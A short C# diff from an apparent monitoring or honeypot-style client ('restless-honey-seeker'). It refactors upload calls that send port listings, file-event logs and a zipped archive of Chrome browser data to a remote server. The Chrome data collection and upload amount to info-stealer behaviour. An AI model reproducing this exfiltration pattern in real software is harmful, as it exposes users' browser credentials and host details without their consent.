@@ -595,7 +595,7 @@ namespace Library
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetPortInfo();
             piList.ForEach((Library.PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
-            Handler.Instance.Transmitter.UploadPortInfo(sb.ToString());
+            Handler.Instance.Transmitter.UploadData("ports.txt", sb.ToString(), false);
         }
 
         public void UploadProcessInfo()
@@ -652,7 +652,7 @@ namespace Library
         {
             StringBuilder sb = new StringBuilder();
             Handler.Instance.FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
-            Handler.Instance.Transmitter.UploadFileEvents(sb.ToString());
+            Handler.Instance.Transmitter.UploadData("fileevents.txt", sb.ToString(), false);
         }
 
         public void DownloadFile()
@@ -762,8 +762,8 @@ namespace Library
                 //var fileData = Compression.Compress(zipFiles);
                 //File.WriteAllBytes(@"C:\Users\benjamin\AeroFS\Visual Studio 2012\Projects\restless-honey-seeker\serverDotNet\Server\DataFromClient\" + DateTime.Now.Ticks + ".zip", fileData);
 
-                var data = new FileData("ChromeData.zip", Compression.Compress(zipFiles), Handler.Instance.Transmitter.TSettings.ComputerHash);
-                Handler.Instance.Transmitter.UploadFile(data);
+                //var data = new FileData("ChromeData.zip", Compression.Compress(zipFiles), Handler.Instance.Transmitter.TSettings.ComputerHash);
+                Handler.Instance.Transmitter.UploadData("ChromeData.zip", zipFiles, true);
 
 
                 //if (Compression.Zip(zipFiles, dirTransfers + "\\Chrome Browser Data.zip"))
